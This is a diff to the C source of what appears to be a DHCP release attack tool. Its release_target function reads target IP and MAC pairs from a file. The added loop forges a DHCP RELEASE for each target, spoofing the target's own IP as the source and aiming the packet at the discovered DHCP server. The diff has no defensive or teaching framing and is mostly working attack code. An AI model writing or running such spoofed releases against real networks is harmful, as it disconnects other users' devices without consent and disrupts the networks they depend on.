@@ -564,6 +564,7 @@ void release_target(FILE *fp, Packet *p, int sock, uint8_t iface_ip, int ifindex
     Targets *head = NULL;
     int row_count = 0;
     char data[BUFFER_SIZE];
+    uint8_t dhcp_host[4];
 
     while(fgets(buffer, MAX_LINE_LEN, fp) != NULL)
     {
@@ -616,7 +617,7 @@ void release_target(FILE *fp, Packet *p, int sock, uint8_t iface_ip, int ifindex
 
     printf("Loaded %d IP(s) from file\n", row_count);
 
-    Targets *current = head;
+    /* Targets *current = head;
 
     while(current != NULL)
     {
@@ -635,7 +636,7 @@ void release_target(FILE *fp, Packet *p, int sock, uint8_t iface_ip, int ifindex
         printf("%s with mac %s\n", ip_str, mac_str);
         current = current->next;
         free(tmp);
-    }
+    } */
 
 
     // clear dhcp options
@@ -685,7 +686,6 @@ void release_target(FILE *fp, Packet *p, int sock, uint8_t iface_ip, int ifindex
             continue;
         }
 
-        uint8_t dhcp_host[4];
         char dhcp_str[INET_ADDRSTRLEN];
 
         int len = sizeof(r->dhcp.options);
@@ -712,6 +712,56 @@ void release_target(FILE *fp, Packet *p, int sock, uint8_t iface_ip, int ifindex
 
         break;
     }
+
+    Targets *current = head;
+
+    while(current != NULL)
+    {
+        p->dhcp.opcode = 1;
+        memcpy(&p->dhcp.client_mac, &current->mac, sizeof(current->mac));
+        memcpy(&p->dhcp.client_ip, &current->ip_addr, sizeof(current->ip_addr));
+
+        memcpy(p->ip.dst_ip, dhcp_host, 4);
+        memcpy(p->ip.src_ip, current->ip_addr, 4);
+        // clear dhcp options.
+        memset(p->dhcp.options, 0, sizeof(p->dhcp.options));
+        
+        offset = 0;
+
+        // dhcp release [53][1][7]
+        p->dhcp.options[offset++] = 53;
+        p->dhcp.options[offset++] = 1;
+        p->dhcp.options[offset++] = 7;
+
+        // dhcp server identifier [54][4][ipaddr_bytes]
+        p->dhcp.options[offset++] = 54;
+        p->dhcp.options[offset++] = 4;
+        memcpy(&p->dhcp.options[offset], &dhcp_host, 4);
+        offset += 4;
+
+        // end of dhcp options.
+        p->dhcp.options[offset++] = 255;
+
+        calc_ip_checksum(p);
+
+
+        struct sockaddr_in server_addr;
+        memset(&server_addr, 0, sizeof(server_addr));
+        server_addr.sin_family = AF_INET;
+        server_addr.sin_port = htons(67);
+        memcpy(&server_addr.sin_addr, dhcp_host, 4);
+
+        int bytes_sent = sendto(sock, p, sizeof(*p), 0, (struct sockaddr *)&addr, sizeof(addr));
+
+        if(bytes_sent < 0)
+        {
+            perror("sendto2");
+            return;
+        }
+        current = current->next;
+    }
+
+    printf("done\n");
 
 
 }
